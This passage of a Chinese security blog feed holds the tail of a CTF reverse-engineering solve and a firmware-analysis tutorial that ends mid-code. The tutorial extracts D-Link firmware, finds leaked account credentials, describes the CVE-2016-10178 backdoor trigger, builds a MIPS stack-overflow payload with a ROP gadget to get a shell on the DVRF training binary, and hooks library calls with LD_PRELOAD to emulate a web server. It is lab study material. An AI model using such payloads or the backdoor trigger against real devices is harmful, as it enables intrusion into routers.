class="number">0x00000C9A</span>, <span class="number">0x00001F8F</span>],</span><br><span class="line">        [<span class="number">0x0000257F</span>, <span class="number">0x00000359</span>, <span class="number">0x00001831</span>, <span class="number">0x000021B7</span>, <span class="number">0x00000BA8</span>, <span class="number">0x00000FC5</span>, <span class="number">0x00000BA4</span>, <span class="number">0x000024E2</span>, <span class="number">0x00001241</span>, <span class="number">0x00000D53</span>, <span class="number">0x00000C82</span>, <span class="number">0x00001240</span>, <span class="number">0x00002241</span>, <span class="number">0x00001156</span>, <span class="number">0x0000116A</span>, <span class="number">0x000005F3</span>, <span class="number">0x000022D5</span>, <span class="number">0x000008DA</span>, <span class="number">0x000014A3</span>, <span class="number">0x0000059E</span>],</span><br><span class="line">        [<span class="number">0x00001675</span>, <span class="number">0x00000AA9</span>, <span class="number">0x00000D8B</span>, <span class="number">0x00000D31</span>, <span class="number">0x00001722</span>, <span class="number">0x000006C8</span>, <span class="number">0x0000151B</span>, <span class="number">0x000017D8</span>, <span class="number">0x00001FEF</span>, <span class="number">0x00001624</span>, <span class="number">0x00002307</span>, <span class="number">0x00000CB9</span>, <span class="number">0x0000053C</span>, <span class="number">0x00000230</span>, <span class="number">0x00001EAA</span>, <span class="number">0x00001FD1</span>, <span class="number">0x00000FAD</span>, <span class="number">0x00001E30</span>, <span class="number">0x00002345</span>, <span class="number">0x00001583</span>],</span><br><span class="line">        [<span class="number">0x000001D1</span>, <span class="number">0x0000056E</span>, <span class="number">0x00000AA3</span>, <span class="number">0x0000223C</span>, <span class="number">0x000009A4</span>, <span class="number">0x000006C9</span>, <span class="number">0x00000112</span>, <span class="number">0x00001977</span>, <span class="number">0x00002512</span>, <span class="number">0x00000B60</span>, <span class="number">0x0000081A</span>, <span class="number">0x00000F06</span>, <span class="number">0x00001329</span>, <span class="number">0x000011AA</span>, <span class="number">0x00002404</span>, <span class="number">0x00000E57</span>, <span class="number">0x0000011E</span>, <span class="number">0x000011DC</span>, <span class="number">0x00002474</span>, <span class="number">0x00001BC7</span>],</span><br><span class="line">        [<span class="number">0x000022BE</span>, <span class="number">0x00001F17</span>, <span class="number">0x00000588</span>, <span class="number">0x00001B80</span>, <span class="number">0x00001479</span>, <span class="number">0x000016EF</span>, <span class="number">0x000008CA</span>, <span class="number">0x00000D6E</span>, <span class="number">0x0000138F</span>, <span class="number">0x00001054</span>, <span class="number">0x000021FA</span>, <span class="number">0x00000102</span>, <span class="number">0x000013A6</span>, <span class="number">0x00000195</span>, <span class="number">0x000002D1</span>, <span class="number">0x00002594</span>, <span class="number">0x00001369</span>, <span class="number">0x00002534</span>, <span class="number">0x000015C5</span>, <span class="number">0x0000168A</span>]]</span><br><span class="line">enc1 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc[::-<span class="number">1</span>]:</span><br><span class="line">    enc1 = enc1*<span class="number">10000</span>+i</span><br><span class="line">data1= [<span class="number">0</span>]*<span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(data): <span class="comment">#enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> val[::-<span class="number">1</span>]:</span><br><span class="line">        data1[i] = data1[i]*<span class="number">10000</span>+j</span><br><span class="line">enc1 += data1[<span class="number">9</span>]</span><br><span class="line">enc1 -= data1[<span class="number">8</span>]</span><br><span class="line">enc1 += data1[<span class="number">7</span>]</span><br><span class="line">enc1 -= data1[<span class="number">6</span>]</span><br><span class="line">enc1 += data1[<span class="number">5</span>]</span><br><span class="line">enc1 //= data1[<span class="number">4</span>]</span><br><span class="line">enc1 -= data1[<span class="number">3</span>]</span><br><span class="line">enc1 += data1[<span class="number">2</span>]</span><br><span class="line">enc1 //= data1[<span class="number">1</span>]</span><br><span class="line">enc1 -= data1[<span class="number">0</span>]</span><br><span class="line">ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> enc1:</span><br><span class="line">    ans += <span class="built_in">chr</span>(enc1%<span class="number">128</span>)</span><br><span class="line">    enc1 //= <span class="number">128</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(ans))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -[ACTF] -[dropper] </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>固件分析初试</title>
      <link href="/2022/06/24/%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%88%9D%E8%AF%95/"/>
      <url>/2022/06/24/%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%88%9D%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206242008925.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206242008925.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">m</p><p>U-Boot(Universal Boot Loader)，即通用Bootloader，是德国DENX小组开发的用于多种嵌入式CPU的bootloader程序</p><p>Legacy-uImage<br>在kernel镜像的基础上，加上64Byte的信息提供给uboot使用</p><p>binwalk分析一下，是Squashfs文件系统</p><div class="story post-story"><h2 id="Binwalk如何进行提取："><a href="#Binwalk如何进行提取：" class="headerlink" title="Binwalk如何进行提取："></a>Binwalk如何进行提取：</h2><p>通过maigc特征集与文件进行比对，但识别效率比file命令高多了</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206242016218.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206242016218.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>binwalk -Me 解压得到</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206242219239.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206242219239.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>文件系统是操作系统的重要组成部分，是操作运行的基础。不同的路由器使用的文件系统格式不尽相同。根文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中。路由器希望文件系统越小越好，所以这些文件系统中各种压缩格式随处可见。</p><p> Squashfs是一个只读格式的文件系统，具有超高压缩率，其压缩率最高可达34%。当系统启动后，会将文件系统保存在一个压缩过的文件系统文件中，这个文件可以使用换回的形式挂载并对其中的文件进行访问，当进程需要某些文件时，仅将对应部分的压缩文件解压缩。 </p><p>Squashfs文件系统常用的压缩格式有GZIP、LZMA、LZO、XZ（LZMA2）。路由器的根文件系统通常会按照Squashfs文件系统常用压缩格式中的一种进行打包，形成一个完整的Squashfs文件系统，然后与路由器操作系统的内核一起形成更新固件。 </p><p>由于squashFS可以在不需要解压的情况下直接挂载，因此有许多应用场景，例如： 1、安装Linux时用的live cd 2、小型嵌入式设备中的rootfs。rootfs一般以压缩好的形式存放在ROM中，如果开机时把整个rootfs都解压到内存里再读取，对于ROM和RAM容量一般都很小的小型嵌入式设备来说性价比太低。</p></div><div class="story post-story"><h2 id="0x2-静态分析"><a href="#0x2-静态分析" class="headerlink" title="0x2 静态分析"></a>0x2 静态分析</h2><p>从Dlink固件里面提取样本，打开发现被加密了。</p><p>如生成字典用的crunch、rsmangler，爆破用的frackzip等</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206301315538.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206301315538.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>直接使用教程的密码beUT9Z，解压如下</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206301342537.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206301342537.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><ul><li>.mbn：高通的一套用于加载网络环境的文件（modem software configuration）</li><li>.yaffs2：针对NAND芯片设计的嵌入式文件系统，可用unyaffs提取</li></ul><p>核心应该是2K-mdm-image-mdm9625.yaffs2，用unyaffs提取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unyaffs 2K-mdm-image-mdm9625.yaffs2 yaffs2-root/</span><br></pre></td></tr></table></figure><p>接下来我们查找该路径下的所有.conf文件，.conf文件多是配置文件，有可能从中可以发现敏感的信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name &#x27;*.conf&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206301404793.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206301404793.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>其中的inadyn-mt.conf文件引起了我们注意，这是no-ip应用的配置文件，no-ip就是一个相当于花生壳的东西，可以申请动态域名。我们从中可以发现泄露的no-ip的登陆账号及密码。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206301406307.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206301406307.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>我们还从shadow文件中找到了root账号的密码，通过爆破可以得到root的密码为1234。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206301409662.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206301409662.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>接下来使用firmwalker来自动化遍历固件系统中的所有可疑文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/craigz28/firmwalker.git</span><br></pre></td></tr></table></figure><p>Firmwalker是一个bash脚本，用于扫描从IoT固件提取的文件以查看它们是否容易受到攻击。唯一的要求是该工具和提取的固件文件应位于同一文件夹中。</p><p>将它们放置在相同的位置后，由Firmwalker生成的输出文件-Firmwalker.text-将突出显示潜在问题的列表，可以是以下任意一个：</p><p>etc &#x2F; ssl目录<br>etc &#x2F; passwd和etc &#x2F; shadow<br>配置，脚本和其他.bin文件<br>关键字，例如远程，管理员，密码等。<br>常见的二进制文件，例如dropbear，tftp和ssh<br>物联网设备上存在的常见Web服务器<br>随机IP地址，电子邮件ID和URL<br>使用Shodan CLI调用Shodan API的实验功能<br>面临任何这些问题的所有物联网设备都容易受到攻击。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./firmwalker.sh yaffs2-root/   </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206301420639.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206301420639.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>除了配置文件外，分析存在风险的二进制程序也很重要。查看自启动的程序，在etc&#x2F;init.d目录下存放启动时运行的程序和脚本，一个start_appmgr脚本引起了我们注意，mgr一般就是主控程序的意思。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206301430753.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206301430753.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>查看脚本，该脚本会在开机的时候以服务的形式运行&#x2F;bin&#x2F;appmgr程序。</p><p>用IDA打开该文件<img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206301457043.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206301457043.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>发现一个后门，这个漏洞被收录到<a href="https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html">CVE-2016-10178</a></p><p>只要连接该固件的39889端口并发送HELODBG的字符串，就可以进行远程执行命令。</p></div><div class="story post-story"><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>采用Attify</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206301956214.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206301956214.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fat.py &#x27;/home/iot/Documents/DWP2360b-firmware-v206-rc018.bin&#x27;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220630195056945.png" class="lazyload" data-srcset="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220630195056945.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220630195056945"></p><p>通过192.168.0.50即可访问固件</p><h3 id="调试固件"><a href="#调试固件" class="headerlink" title="调试固件"></a>调试固件</h3><p>用到了Damn Vulnerable Router Firmware这个项目</p><p>先用binwalk解压</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206302007334.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206302007334.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>提取出来的目录里有个文件夹pwnable，里面存放着漏洞程序示例，选取stack_bof_01程序进行实验，程序的源代码可以在DVRF&#x2F;Pwnable Source&#x2F;Intro&#x2F;里查看</p><p>先用readelf查看文件信息，mips架构 小端序。。。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206302011938.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206302011938.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>文件的主要逻辑：strcpy造成了栈溢出，存在后门函数。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207141947551.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207141947551.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h3 id="动调"><a href="#动调" class="headerlink" title="动调"></a>动调</h3><p>拷贝wmu-mipsel-static到固件根目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp (which qemu-mipsel-static) .</span><br></pre></td></tr></table></figure><p>用qemu虚拟运行stack_bof_01：</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206302015927.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206302015927.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>以调试的方式启动程序，并在1234端口进行监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 1111</span><br></pre></td></tr></table></figure><p>打开一个新的shell，运行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch pwnable/Intro/stack_bof_01</span><br><span class="line"></span><br><span class="line"># 设置架构</span><br><span class="line">set architecture mips</span><br><span class="line"></span><br><span class="line">#设置调试端口</span><br><span class="line">target remote 127.0.0.1:1234</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206302023989.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206302023989.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207142212118.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207142212118.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">v  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/D/D/F/_/squashfs-root&gt; </span><br><span class="line">python2 -c &quot;print &#x27;a&#x27;*204+&#x27;\x50\x09\x40\x00&#x27;&quot; &gt;payload</span><br><span class="line"></span><br><span class="line">iot@attifyos ~/D/D/F/_/squashfs-root&gt; </span><br><span class="line">sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 (cat payload)</span><br></pre></td></tr></table></figure><p>如果直接把跳转地址设置为后门函数dat_shell的起始地址0x400950会触发异常</p><p>程序成功跳转至dat_shell，但依旧崩溃,因为我们溢出的时候把 $gp 寄存器也覆盖了，$gp 寄存器是用来全局指针寻址用的，覆盖了他就会导致程序无法正常寻址，自然程序就会 crash。<br><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207142228486.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207142228486.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207142230424.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207142230424.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>查询MIPS指令集，MIPS跳转方式：</p><blockquote><p>1.设置t9寄存器数值，跳转到t9寄存器；</p><p>2.在执行某个函数之前，将要跳转的地址保存在ra寄存器中，执行函数后可跳转。</p></blockquote><p>qemu不能vmmap。</p><p>ida打开libc.so.0</p><p>在MIPS中，函数内部会通过t9寄存器和gp寄存器来找数据，地址等。同时在mips的手册内默认$t9的值为当前函数的开始地址，</p><p>如果在执行00400958 addu $gp, $t9是手动把$t9改成0x00400950，后面就正常了。</p><p>所以现在需要找一个gadget，通过t9跳转过去，这也是mips常规的用法，比如main开头调用memet。</p><p><img src="https://p4.ssl.qhimg.com/t011b4aaf351baf9d54.png" class="lazyload" data-srcset="https://p4.ssl.qhimg.com/t011b4aaf351baf9d54.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><p>sp：MIPS架构中，栈是向下增长的，也就是栈底在高地址，栈顶在低地址。在图3-2中，GPR[sp]代表通用寄存器sp（$29）指向栈顶，又称sp为栈指针（stack pointer）</p><p>其偏移0x6b20处确实有一个gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00006B20 00 00 B9 8F                   lw      $t9, arg_0($sp)</span><br><span class="line">.text:00006B24 09 F8 20 03                   jalr    $t9</span><br></pre></td></tr></table></figure><p>p &amp;memset #查看memset地址，为0x408b6e10。（友情提示，需要在memset处下断点，运行至memset，不然由于之前没有运行memset，memset地址为其got地址）</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207282124174.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207282124174.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>ida打开libc.so.0，查看memset偏移为0x0001BE10 </p><p>则libc基地址为：0x408b6e10-0x0001BE10&#x3D;0x4089b000</p><p>gadget地址为 ：0x4089b000+0x6b20&#x3D;0x408a1b2</p><p>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &quot;print &#x27;a&#x27;*204+&#x27;\x20\x1b\x8a\x40&#x27;+&#x27;\x50\x09\x40\x00&#x27;&quot; &gt; payload</span><br><span class="line">sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01  (cat payload)</span><br></pre></td></tr></table></figure><p>getshell</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207282127546.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207282127546.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p></div><div class="story post-story"><h2 id="修复固件运行环境"><a href="#修复固件运行环境" class="headerlink" title="修复固件运行环境"></a>修复固件运行环境</h2><p>有一些固件因为硬件依赖等原因导致qemu和firmadyne之类的软件无法正确模拟</p><p>模拟固件运行的实质其实就是把固件的Web程序跑起来，而模拟失败则说明Web程序运行出错了，我们接下来就要看看Web程序报错的原因以及如何修复运行环境。</p><p>拿到dir605L_FW_113.bin固件</p><p>binwalk解析，进入文件系统目录squashfs-root-0，找到web服务程序Boa （在bin目录下</p><p>Boa程序是一个轻量级的web服务器程序，常见于嵌入式系统中。dlink就是在boa开源代码的基础上新增了很多功能接口以实现路由器上的不同功能。boa程序的路径为&#x2F;bin&#x2F;boa，同时我们发现在&#x2F;etc&#x2F;boa路径下还有个boa的密码配置文件，我们可以直接获取到boa加密后的密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cp (which qemu-mips-static) .</span><br><span class="line">sudo chroot . ./qemu-mips-static bin/boa</span><br><span class="line">补充</span><br><span class="line"></span><br><span class="line">mips 是32位大端字节序</span><br><span class="line"></span><br><span class="line">mipsel 是32位小端字节序</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208081404930.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208081404930.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>注：APMIB 是个Realtek（网卡？）的玩意</p><p>由于没有flash，导致读mib失败</p><p>拖到反编译工具中分析。先定位到字符串“Initialize AP MIB failed!”的位置。注意到在输出这个字符串前有个调用APMIB初始化的跳转，在此下断点，</p><p>IDA gdbserver远程调试</p><p>QEMU的远程调试不需要gdbserver，-g 指定端口，ida 远程调试选项指定相应端口就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mips-static -g 23946 bin/boa</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208081950211.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208081950211.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>BNEZ是branch not equal to zero</p><p>条件转移指令，当寄存器中内容不为0时转移发生</p><p><code>apmib_init</code> 函数返回 <code>0</code> 导致了这个错误</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208082005052.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208082005052.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>编写劫持函数动态库：</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208082036125.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208082036125.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>在apmib.so函数里面。</p><p>直接写一个动态库 <code>apmib_init</code>函数返回 <code>1</code> 劫持</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">apmib_init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mips-linux-gnu-gcc -Wall -fPIC -shared apmib.c -o apmib-ld.so</span><br></pre></td></tr></table></figure><p>然后运行 -E优先选择我们的so文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-mips-static -E LD_PRELOAD=&quot;./apmib-ld.so&quot; ./bin/boa</span><br></pre></td></tr></table></figure><p>但是依旧报错</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208082052341.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208082052341.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>再次动调发现我们的 <code>apmib_get</code> 函数时出错了</p><p>可以将 <code>apmib.so</code> 直接拖出来 <code>IDA32</code> 分析一下 <code>apmib_get</code> 函数</p><p><a href="https://jyhshin.pixnet.net/blog/post/47162002-realtek-apmib-library">https://jyhshin.pixnet.net/blog/post/47162002-realtek-apmib-library</a><br><code>apmib_get()</code>, 讀取 <code>RAM</code> 的 <code>mib</code> 值<br><code>qemu</code> 模拟不了与硬件交互的情况，所以读取不到</p><p>重新写</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIB_IP_ADDR 170</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIB_HW_VER 0x250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIB_CAPTCHA 0x2c1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">apmib_init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fork</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span 